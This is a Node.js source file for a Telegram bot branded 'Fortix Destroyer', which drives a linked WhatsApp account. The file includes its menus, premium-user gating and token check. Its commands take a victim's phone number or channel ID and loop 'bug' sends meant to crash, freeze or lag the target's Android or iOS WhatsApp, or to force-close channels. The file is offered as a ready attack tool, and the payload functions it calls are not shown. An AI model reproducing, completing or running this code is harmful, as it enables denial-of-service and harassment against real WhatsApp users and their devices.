const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { botToken, ownerId } = require('./config');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment-timezone');
const readline = require('readline');

const bot = new TelegramBot(botToken, { polling: true });
const startTime = new Date();

const protectedPremiumIds = [7112830272, 8164834434];

let superVip = JSON.parse(fs.readFileSync('./db/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./db/premium.json'));
let owners = JSON.parse(fs.readFileSync('./db/owners.json'));

function savePremiumUsers() {
  fs.writeFileSync('./db/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveOwnersUsers() {
  fs.writeFileSync('./db/owners.json', JSON.stringify(owners, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile('./db/premium.json', (data) => (premiumUsers = data));
watchFile('./db/owners.json', (data) => (owners = data));
watchFile('./db/superVip.json', (data) => (superVip = data));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

//========================================================\\ 

//========================================================\\ 
let bannedUsers = [];
try {
  bannedUsers = JSON.parse(fs.readFileSync('./banned.json'));
} catch (e) {
  bannedUsers = [];
}

function saveBannedUsers() {
  fs.writeFileSync('./banned.json', JSON.stringify(bannedUsers, null, 2));
}
//========================================================\\ 

//========================================================\\ 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/OwnerRepo/NameRepo/main/db.json";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data; 
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token database di GitHub!"), error.message);
        return [];
    }
}

async function validateToken() {
    console.log(chalk.blue("Loading Check Token Bot..."));
    const validTokens = await fetchValidTokens();

    if (!Array.isArray(validTokens)) {
        console.log(chalk.red("Data token tidak valid dari GitHub!"));
        process.exit(1);
    }

    if (!validTokens.includes(botToken)) { // PAKAI botToken di sini
        console.log(chalk.red("Token Tidak Terdaftar Di Database! Silahkan Hubungi @danzmodss"));
        process.exit(1);
    }

    console.clear();
    console.log(chalk.bold.white("✅ Token Valid! Menyiapkan Bot...\n"));
}

async function startBot() {
    console.log(chalk.green("✅ Bot Berhasil Dijalanin! - @danzmodss"));
}
//========================================================\\  

//========================================================\\ 
const usePairingCode = true;
let sock;
let whatsappStatus = false;
let onlyGroupMode = false;

function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; 

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}


function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);


const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

const question = (text) => new Promise((resolve) => rl.question(text, resolve));

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
//========================================================\\  

//========================================================\\ 
let reconnectAttempts = 0;

const startSesi = async () => {
    await validateToken(); 
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    sock = makeWASocket(connectionOptions);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            whatsappStatus = true;
            sock.newsletterFollow(global.idch);
            console.clear();
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');

            console.log(`
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈

╭────── Bot Berhasil Connect ──────
│Waktu: ${currentTime} WIB
│Note : Gunakan Bot Sebaik Mungkin
╰───────────────────────
            `);

            startBot();
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            whatsappStatus = false;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silahkan Hapus Session Dan Restart.'
            );
            if (shouldReconnect) {
                setTimeout(() => {
                    startSesi();
                }, 5000);
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    if (usePairingCode && !sock.authState.creds.registered) {
        console.clear();
        console.log(chalk.bold.white("Enter Your Number. Example : 62xxx\n"));
        let phoneNumber = await question(chalk.bold.white(`Your Number : `));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

        // Tambahan fix supaya luar negeri bisa pairing
        if (phoneNumber.startsWith('0')) {
            console.log(chalk.red('Nomor tidak boleh diawali dengan 0. Format harus kode negara.'));
            process.exit(1);
        }

        try {
            const code = await sock.requestPairingCode(phoneNumber.trim());
            const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(chalk.bold.white(`YOUR CODE: `), chalk.bold.white(formattedCode));
        } catch (error) {
            console.log(chalk.red('Gagal mendapatkan pairing code:'), error.message);
            console.log(chalk.yellow('Pastikan nomor aktif di WhatsApp, format benar, dan gunakan VPN sesuai negara nomor.'));
            process.exit(1);
        }
    }
};
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  if (bannedUsers.includes(senderId)) return;
  const userStatus = premiumUsers.includes(senderId) ? "𝐘𝐞𝐬" : "𝐍𝐨";
  const waStatus = whatsappStatus ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝" : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝";
  const groupModeStatus = onlyGroupMode ? "𝐎𝐧" : "𝐎𝐟𝐟";

  let caption = `
\`\`\`JavaScript
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈──── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐅⃯𝐨𝐫້⃯𝐭᤻𝐢⃗𝐱 𝐃𝐞𑂹ຼ᳑𝐬𝐭𝐫ົ⃯𝐨𝐲⃯⃗𝐞𝐫᭨
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎 
╰─➤ 𝐆𝐫𝐨𝐮𝐩 𝐌𝐨𝐝𝐞 : ${groupModeStatus}
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭

◈──── [ 𝐒 𝐓 𝐀 𝐓 𝐔 𝐒 ] ────◈
╰─➤ 𝐘𝐨𝐮𝐫 𝐏𝐫𝐞𝐦 : ${userStatus} 
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${waStatus}
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${getOnlineDuration()}

\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  bot.sendPhoto(chatId, "https://img1.pixhost.to/images/5527/595380735_skyzopedia.jpg", {
    caption: caption,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "─[ Меню ☇ ошибок ]─", callback_data: "bugmenu" },
          { text: "─[ Меню ☇ владельца ]─", callback_data: "ownermenu" }
        ],
        [
          { text: "─[ Tq To ]─", callback_data: "tqto" }
        ]
      ]
    }
  });
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  if (bannedUsers.includes(senderId)) return;
  const userStatus = premiumUsers.includes(senderId) ? "𝐘𝐞𝐬" : "𝐍𝐨";
  const waStatus = whatsappStatus ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝" : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝";
  const groupModeStatus = onlyGroupMode ? "𝐎𝐧" : "𝐎𝐟𝐟";

  let caption = `
\`\`\`JavaScript
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈──── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐅⃯𝐨𝐫້⃯𝐭᤻𝐢⃗𝐱 𝐃𝐞𑂹ຼ᳑𝐬𝐭𝐫ົ⃯𝐨𝐲⃯⃗𝐞𝐫᭨
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎 
╰─➤ 𝐆𝐫𝐨𝐮𝐩 𝐌𝐨𝐝𝐞 : ${groupModeStatus}
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭

◈──── [ 𝐒 𝐓 𝐀 𝐓 𝐔 𝐒 ] ────◈
╰─➤ 𝐘𝐨𝐮𝐫 𝐏𝐫𝐞𝐦 : ${userStatus} 
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${waStatus}
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${getOnlineDuration()}

\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  bot.sendPhoto(chatId, "https://img1.pixhost.to/images/5527/595380735_skyzopedia.jpg", {
    caption: caption,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "─[ Меню ☇ ошибок ]─", callback_data: "bugmenu" },
          { text: "─[ Меню ☇ владельца ]─", callback_data: "ownermenu" }
        ],
        [
          { text: "─[ Tq To ]─", callback_data: "tqto" }
        ]
      ]
    }
  });
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;

  let caption = `
\`\`\`JawaScript
╭──────[ 𝐁 𝐔 𝐆 — 𝐌 𝐄 𝐍 𝐔 ]───────◈
│➵ /ᴅᴇʟᴀʏᴠᴜᴄᴋ <62×××>
│╰┈➤ ɴɢᴜʀᴀs ᴋᴜᴏᴛᴀ x ᴅᴇʟᴀʏ ɪɴᴠ
│
│➵ /ᴅᴇʟᴀʏɪɴᴠɪs <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ɪɴᴠɪs
│
│➵ /ᴀᴛᴛᴀᴄᴋᴜɪ <62×××>
│╰┈➤ ᴄʀᴀsʜ ᴜɪ ᴀɴᴅʀᴏ <ᴛɪᴅᴀᴋ sᴇᴍᴜᴀ ʜᴘ ᴀɴᴅʀᴏ ᴄʀᴀsʜ>
│
│➵ /ᴄᴏᴍʙᴏ <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ɪɴᴠ x ᴄʀᴀsʜ ᴜɪ x ʙʟᴀɴᴋ
│
│➵ /ᴄʀᴀsʜɪᴏs
│╰┈➤ ᴄʀᴀsʜ ᴅᴇᴠɪᴄᴇ ɪᴏs 
│
│➵ /ғᴏʀᴄᴇᴄʜ <ɴᴇᴡsʟᴇᴛᴛᴇʀ>
│╰┈➤ ғᴏʀᴄᴇ ᴄʟᴏsᴇ ᴄʜᴀɴɴᴇʟ
╰─────────────────────────────◈
\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/oadxc6.jpg", {
    caption: caption,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Tq To", callback_data: "tqto" }
        ]
      ]
    }
  });
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;

  let caption = `
\`\`\`JawaScript
╭──────[ 𝐎 𝐖 𝐍 𝐄 𝐑 — 𝐌 𝐄 𝐍 𝐔 ]──────◈
│➵ /ᴏɴʟʏɢᴄ <ᴏɴ - ᴏғғ>
│╰┈➤ ʙᴏᴛ ᴋʜᴜsᴜs ɢʀᴏᴜᴘ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʀᴇsᴘᴏɴ ᴅɪ ᴘʀɪᴠᴀᴛ ᴄʜᴀᴛ
│
│➵ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴀᴅᴅ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴅᴇʟ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ʟɪsᴛᴘʀᴇᴍ 
│╰┈➤ ᴄᴇᴋ ᴀʟʟ ɪᴅ ᴀᴄᴄᴇs ᴘʀᴇᴍ
│[ ɴᴏᴛᴇ : ᴀᴄᴄᴇs ᴘʀᴇᴍ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ʙᴜɢ ]
│
│➵ /ᴄʟᴇᴀʀᴘʀᴇᴍ <ᴍᴇɴɢʜᴀᴘᴜs sᴇᴍᴜᴀ ɪᴅ ᴀᴄᴄᴇs ᴘʀᴇᴍ>
│╰┈➤ ɪᴅ ʏᴀɴɢ ᴅɪ ʙʟᴏᴋɪʀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴋᴇ ʜᴀᴘᴜs
│
│➵ /ᴀᴅᴅᴏᴡɴᴇʀ <ɪᴅ>
│╰┈➤ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴀᴄᴄᴇs ᴏᴡɴᴇʀ
│
│➵ /ᴅᴇʟᴏᴡɴᴇʀ <ɪᴅ>
│╰┈➤ ᴍᴇɴɢʜᴀᴘᴜs ᴀᴄᴄᴇs ᴏᴡɴᴇʀ
│[ ɴᴏᴛᴇ : ᴀᴄᴄᴇs ᴏᴡɴᴇʀ ʙɪsᴀ ᴀᴅᴅᴘʀᴇᴍ & ᴅᴇʟᴘʀᴇᴍ ]
│
│➵ /ʙᴀɴғᴏʀᴛɪx <ʀᴇᴘʟʏ,ᴛᴀɢ,ɪᴅ>
│╰┈➤ ᴘᴇɴɢɢᴜɴᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ
│
│➵ /ᴜɴʙᴀɴғᴏʀᴛɪx  <ʀᴇᴘʟʏ,ᴛᴀɢ,ɪᴅ>
│╰┈➤ ᴘᴇɴɢɢᴜɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴋsᴇss ʙᴏᴛ ᴋᴇᴍʙᴀʟɪ
│
╰────────────────────────────────◈
\`\`\`
©𝐅𝐨𝐫𝐭𝐢𝐱 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/0l5jmj.jpg", {
    caption: caption,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Tq To", callback_data: "tqto" }
        ]
      ]
    }
  });
});
//========================================================\\ 

//========================================================\\ 
async function crashios(target) {
    for (let i = 0; i <= 10; i++) {
    await iphone(target)
    }
}
//========================================================\\ 
async function delayinvis(target, mention = false) {
    for (let i = 0; i <= 10; i++) {
    await invisibleBug(target) 
    await crashBug(target)
   }
}
//========================================================\\  
async function delayhard(target) {
    for (let i = 0; i <= 10; i++) {
    await delayBug(target) 
    await crashBug(target)
    }
}
//========================================================\\ 
async function crashch(target) {
    for (let i = 0; i <= 100; i++) {
    await forcech1(target)
    await forcech2(target)
    await forcech1(target)
    await forcech2(target)
    }
}
//========================================================\\ 
bot.onText(/\/delayinvis(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    if (bannedUsers.includes(senderId)) return;
    if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.");
    if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Khusus Premium.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah. Contoh: /delayinvis 62xxxxx.");

    const numberTarget = match[1].replace(/[^0-9]/g, '');
    const formattedNumber = numberTarget + "@s.whatsapp.net";

    try {
        await bot.sendPhoto(chatId, "https://files.catbox.moe/ivne61.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝙿𝚛𝚘𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

        for (let i = 0; i < 5; i++) {
            await delayinvis(formattedNumber);
           }

        await bot.sendPhoto(chatId, "https://files.catbox.moe/dnyx9m.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┃ 𝙲ᴏᴍᴍᴀ𝚗𝚍 : /delayinvis 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

    } catch (error) {
        console.error('❌ Error delayinvis:', error);
        bot.sendMessage(chatId, "❌ Gagal mengirim bug delayinvis.");
    }
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/combo(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    if (bannedUsers.includes(senderId)) return;
    if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.");
    if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Khusus Premium.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah. Contoh: /combo 62xxxxx.");

    const numberTarget = match[1].replace(/[^0-9]/g, '');
    const formattedNumber = numberTarget + "@s.whatsapp.net";

    try {
        await bot.sendPhoto(chatId, "https://files.catbox.moe/ivne61.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝙿𝚛𝚘𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

        for (let i = 0; i < 5; i++) {
            await delayinvis(formattedNumber);
            await delayhard(formattedNumber);
           }

        await bot.sendPhoto(chatId, "https://files.catbox.moe/dnyx9m.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┃ 𝙲ᴏᴍᴍᴀ𝚗𝚍 : /combo
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

    } catch (error) {
        console.error('❌ Error combo:', error);
        bot.sendMessage(chatId, "❌ Gagal mengirim bug combo.");
    }
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/crashios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    if (bannedUsers.includes(senderId)) return;
    if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.");
    if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Khusus Premium.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah. Contoh: /crashios 62xxxxx.");

    const numberTarget = match[1].replace(/[^0-9]/g, '');
    const formattedNumber = numberTarget + "@s.whatsapp.net";

    try {
        await bot.sendPhoto(chatId, "https://files.catbox.moe/ivne61.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝙿𝚛𝚘𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

        for (let i = 0; i < 5; i++) {
            await crashios(formattedNumber);
           }

        await bot.sendPhoto(chatId, "https://files.catbox.moe/dnyx9m.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┃ 𝙲ᴏᴍᴍᴀ𝚗𝚍 : /crashios 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

    } catch (error) {
        console.error('❌ Error forceclose:', error);
        bot.sendMessage(chatId, "❌ Gagal mengirim bug crashios.");
    }
});
//========================================================\\ 

//========================================================\\    
bot.onText(/\/delayhard(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    if (bannedUsers.includes(senderId)) return;
    if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.");
    if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Khusus Premium.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah. Contoh: /delayhard 62xxxxx.");

    const numberTarget = match[1].replace(/[^0-9]/g, '');
    const formattedNumber = numberTarget + "@s.whatsapp.net";

    try {
        await bot.sendPhoto(chatId, "https://files.catbox.moe/ivne61.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝙿𝚛𝚘𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

        for (let i = 0; i < 5; i++) {
            await delayhard(formattedNumber);
           }

        await bot.sendPhoto(chatId, "https://files.catbox.moe/dnyx9m.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
┃ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚂𝚎𝚗𝚍 𝙱𝚞𝚐
┃ 𝚃ᴀʀɢᴇᴛ : ${numberTarget}
┃ 𝙲ᴏᴍᴍᴀ𝚗𝚍 : /delayhard 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
        });

    } catch (error) {
        console.error('❌ Error delayhard:', error);
        bot.sendMessage(chatId, "❌ Gagal mengirim bug delayhard.");
    }
});
//========================================================\\ 

//========================================================\\ 
bot.onText(/\/forcechannel(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    if (bannedUsers.includes(senderId)) return;
    if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.");
    if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Khusus Premium.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Masukkan ID Channel!\nContoh: /forcechannel 123@newsletter");

    const channelId = match[1].trim();

    try {
        await bot.sendPhoto(chatId, "https://files.catbox.moe/ivne61.png", {
            caption: `┏━━━━━𝐅𝐎𝐑𝐓𝐈𝐗 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑━━━━━━┓
